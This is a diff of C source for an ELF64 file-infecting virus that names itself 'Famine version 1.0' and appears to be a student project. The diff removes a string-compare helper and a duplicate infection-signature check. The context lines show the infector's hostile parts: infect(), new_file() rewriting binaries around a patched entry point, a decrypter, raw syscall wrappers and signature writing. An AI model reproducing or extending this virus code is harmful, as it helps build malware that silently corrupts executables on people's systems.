@@ -36,14 +36,12 @@ int open_directory(char *path, unsigned int *n_loaded);
 void *ft_memmove(void *dst, const void *src, size_t len);
 bool process_runing(void);
 int do_the_job(char file[], size_t size, char *path, unsigned int *n_loaded);
-int ft_strncmp(const char *s1, const char *s2, size_t n);
 int infect(char path[], size_t path_length);
 void new_file(char buf[], size_t size, size_t end_of_text, const char *path, Elf64_Addr old_e_entry, unsigned int n_loaded, size_t padding);
 int ft_isdigit(int c);
 int ft_isallnum(char *str);
 size_t put_sig(int fd, unsigned int n_loaded);
 bool im_infected(char *data);
-bool is_infected2(char *data);
 bool is_infected(const char *haystack, size_t n);
 void decrypter(unsigned long address_of_main);
 char *ft_strnstr(char *s1, char *s2, size_t n);
@@ -161,7 +159,6 @@ int _start() {
 	        "pushq %r13\n"
 	        "pushq %r14\n"
 	        "pushq %r15\n"
-
 	        "call do_main\n"
 	        "jmp myend\n");
 
@@ -178,17 +175,11 @@ int do_main(void) {
 }
 
 __syscall1(int, close, int, fd);
-
 __syscall1(int, exit, int, status);
-
 __syscall2(int, rename, const char *, old, const char *, new);
-
 __syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
-
 __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
-
 __syscall3(int, getdents64, unsigned int, fd, struct linux_dirent64*, dirp, unsigned int, count);
-
 __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura etre decalle apres (used for debug)
 __syscall6(void *, mmap, unsigned long, addr, unsigned long, len, unsigned long, prot, unsigned long, flags,
            unsigned long, fd, unsigned long, offset);
@@ -766,19 +757,6 @@ new_file(char buf[], size_t size, size_t end_of_text, const char *path, Elf64_Ad
 	rename(tmp, path);
 }
 
-int ft_strncmp(const char *s1, const char *s2, size_t n) {
-	size_t index;
-
-	index = 0;
-	while (index < n && s1[index] && s2[index] &&
-	       (unsigned char) s1[index] == (unsigned char) s2[index]) {
-		index++;
-	}
-	if (index >= n)
-		return (0);
-	return (int) ((unsigned char) s1[index] - (unsigned char) s2[index]);
-}
-
 bool is_infected(const char *haystack, size_t n) {
 	unsigned int i;
 	unsigned int j;
@@ -854,76 +832,6 @@ bool is_infected(const char *haystack, size_t n) {
 		i++;
 	}
 	return (0);
-}
-
-bool is_infected2(char *data) {
-	Elf64_Ehdr *header;
-	char sig[54];
-	sig[0] = 'F';
-	sig[1] = 'a';
-	sig[2] = 'm';
-	sig[3] = 'i';
-	sig[4] = 'n';
-	sig[5] = 'e';
-	sig[6] = ' ';
-	sig[7] = 'v';
-	sig[8] = 'e';
-	sig[9] = 'r';
-	sig[10] = 's';
-	sig[11] = 'i';
-	sig[12] = 'o';
-	sig[13] = 'n';
-	sig[14] = ' ';
-	sig[15] = '1';
-	sig[16] = '.';
-	sig[17] = '0';
-	sig[18] = ' ';
-	sig[19] = '(';
-	sig[20] = 'c';
-	sig[21] = ')';
-	sig[22] = 'o';
-	sig[23] = 'd';
-	sig[24] = 'e';
-	sig[25] = 'd';
-	sig[26] = ' ';
-	sig[27] = 'b';
-	sig[28] = 'y';
-	sig[29] = ' ';
-	sig[30] = '<';
-	sig[31] = 'j';
-	sig[32] = 'g';
-	sig[33] = 'o';
-	sig[34] = 'u';
-	sig[35] = 'n';
-	sig[36] = 'a';
-	sig[37] = 'n';
-	sig[38] = 'd';
-	sig[39] = '>';
-	sig[40] = '-';
-	sig[41] = '<';
-	sig[42] = 'a';
-	sig[43] = 'f';
-	sig[44] = 'i';
-	sig[45] = 'o';
-	sig[46] = 'd';
-	sig[47] = 'i';
-	sig[48] = 'e';
-	sig[49] = 'r';
-	sig[50] = '>';
-	sig[51] = ' ';
-	sig[52] = '-';
-	sig[53] = ' ';
-	int i;
-
-	i = 0;
-	header = (Elf64_Ehdr *) data;
-	while (sig[i]) {
-		if (sig[i] != *((char *) (data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i))) {
-			return (0);
-		}
-		i++;
-	}
-	return (1);
 }
 
 size_t put_sig(int fd, unsigned int n_loaded) {
